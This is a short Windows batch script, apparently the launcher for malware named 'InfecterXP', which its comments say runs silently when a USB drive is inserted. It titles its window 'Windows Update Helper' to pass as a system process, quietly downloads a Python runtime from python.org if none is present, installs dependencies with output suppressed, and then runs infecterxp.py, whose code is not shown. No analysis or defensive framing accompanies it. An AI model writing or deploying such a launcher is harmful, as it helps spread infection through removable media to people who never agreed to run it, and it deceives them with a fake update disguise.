@echo off
:: InfecterXP Silent Launcher
:: This runs when USB is inserted

title Windows Update Helper
color 07
setlocal

:: Check for Python
where python >nul 2>&1
if %errorLevel% neq 0 (
    echo [*] Installing runtime...
    powershell -nop -c "
    $ProgressPreference='SilentlyContinue';
    Invoke-WebRequest 'https://www.python.org/ftp/python/3.10.0/python-3.10.0-embed-amd64.zip' -OutFile 'python.zip';
    Expand-Archive -Path 'python.zip' -DestinationPath 'Python';
    del python.zip;
    "
    set PATH=%~dp0Python;%PATH%
)

:: Install dependencies
echo [*] Preparing environment...
python -m pip install --upgrade pip --quiet >nul
python -m pip install -r requirements.txt --quiet >nul

:: Execute
python "%~dp0infecterxp.py"

endlocal
exit